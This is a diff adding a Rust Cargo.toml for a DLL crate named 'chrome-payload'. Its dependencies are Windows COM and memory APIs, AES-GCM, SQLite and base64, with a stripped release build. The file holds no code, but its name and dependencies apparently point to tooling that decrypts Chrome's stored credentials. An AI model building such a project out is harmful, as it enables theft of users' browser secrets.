@@ -1,0 +1,29 @@
+[package]
+name = "chrome-payload"
+version = "1.0.0"
+edition = "2021"
+
+[lib]
+name = "chrome_payload"
+crate-type = ["cdylib"]
+
+[dependencies]
+windows = { version = "0.58", features = [
+    "Win32_Foundation",
+    "Win32_System_Com",
+    "Win32_System_Ole",
+    "Win32_System_Threading",
+    "Win32_System_Memory",
+    "Win32_System_SystemServices",
+    "Win32_Security",
+] }
+aes-gcm = { version = "0.10", default-features = false, features = ["aes", "alloc"] }
+rusqlite = { version = "0.31", features = ["bundled"] }
+serde = { version = "1", features = ["derive"] }
+serde_json = "1"
+base64 = "0.22"
+
+[profile.release]
+opt-level = "z"
+strip = true
+lto = true
